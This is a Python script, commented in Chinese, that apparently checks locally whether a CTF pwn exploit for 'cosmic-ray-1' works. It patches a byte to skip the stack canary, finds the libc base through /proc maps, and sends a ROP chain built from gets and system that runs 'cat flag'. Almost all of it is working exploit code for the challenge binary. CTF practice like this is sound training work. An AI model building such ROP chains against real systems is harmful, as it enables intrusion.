#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cosmic-ray-1 本地验证脚本 —— 纯 Python3（无 pwntools）

在 Linux（WSL）里验证 exploit 是否真的能打印 flag，避免浪费远程次数。

用法:
    cp -r /mnt/c/.../pwn-cosmic-ray-1 ~/cosmic-ray-1 && cd ~/cosmic-ray-1   # 建议先拷到 ~ 下
    chmod +x pwn ld-linux-x86-64.so.2 libc.so.6
    python3 test_local.py

它会:
    1. 复制 pwn -> pwn_test，在文件偏移 0x120f 写入 0xeb（je -> jmp，绕过 canary）
    2. 用题目自带的 ld-linux + libc 启动 pwn_test
    3. 读 /proc/<pid>/maps 拿 libc 基址
    4. 发 exp，打印子进程输出，看是否出现 flag
"""
import os
import re
import shutil
import struct
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))

POP_RDI = 0x10c08d
RET     = 0x10c08e
GETS    = 0x87160
SYSTEM  = 0x58750
BSS     = 0x2056e0
PATCH_OFF  = 0x120f
PATCH_BYTE = 0xeb


def p64(x):
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


def build_payload(libc_base):
    p = b"A" * 88 + b"B" * 8 + b"C" * 8
    p += p64(libc_base + POP_RDI) + p64(libc_base + BSS)
    p += p64(libc_base + RET)
    p += p64(libc_base + GETS)
    p += p64(libc_base + POP_RDI) + p64(libc_base + BSS)
    p += p64(libc_base + RET)
    p += p64(libc_base + SYSTEM)
    p = p.ljust(240, b"\x00") + b"cat flag\n"
    return p


def patch_binary():
    src = os.path.join(HERE, "pwn")
    dst = os.path.join(HERE, "pwn_test")
    shutil.copy2(src, dst)
    with open(dst, "r+b") as f:
        f.seek(PATCH_OFF)
        f.write(bytes([PATCH_BYTE]))
    os.chmod(dst, 0o755)
    return dst


def main():
    if not os.path.exists(os.path.join(HERE, "ld-linux-x86-64.so.2")):
        sys.exit("缺少 ld-linux-x86-64.so.2")
    binpath = patch_binary()
    print("[*] patched:", binpath, "(%#x -> %#x)" % (PATCH_OFF, PATCH_BYTE))

    ld = os.path.join(HERE, "ld-linux-x86-64.so.2")
    proc = subprocess.Popen(
        [ld, "--library-path", HERE, binpath],
        cwd=HERE, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )

    # 读 banner（管道下 stdout 全缓冲，可能读不到，无所谓）
    try:
        import select
        r, _, _ = select.select([proc.stdout], [], [], 0.5)
        if r:
            print("[banner]", proc.stdout.readline().decode(errors="replace").strip())
    except Exception as e:
        print("[warn] banner read failed:", e)

    # 读 maps
    time.sleep(0.2)
    with open("/proc/%d/maps" % proc.pid, "r") as f:
        maps = f.read()
    libc_base = None
    for line in maps.split("\n"):
        if "libc.so.6" in line:
            libc_base = int(line.split("-")[0], 16)
            break
    if libc_base is None:
        sys.exit("找不到 libc.so.6，maps:\n" + maps)
    print("[*] libc base = %#x" % libc_base)

    payload = build_payload(libc_base)
    print("[*] exp %d 字节" % len(payload))
    proc.stdin.write(payload)
    proc.stdin.close()

    out = proc.stdout.read()
    print("---- 子进程输出 ----")
    print(out.decode(errors="replace"))

    if b"flag{" in out or b"test_flag" in out or b"flag" in out:
        print("\n[+] 本地验证成功，能看到 flag")
    else:
        print("\n[-] 没看到 flag（可能崩了，检查上面的输出）")


if __name__ == "__main__":
    main()
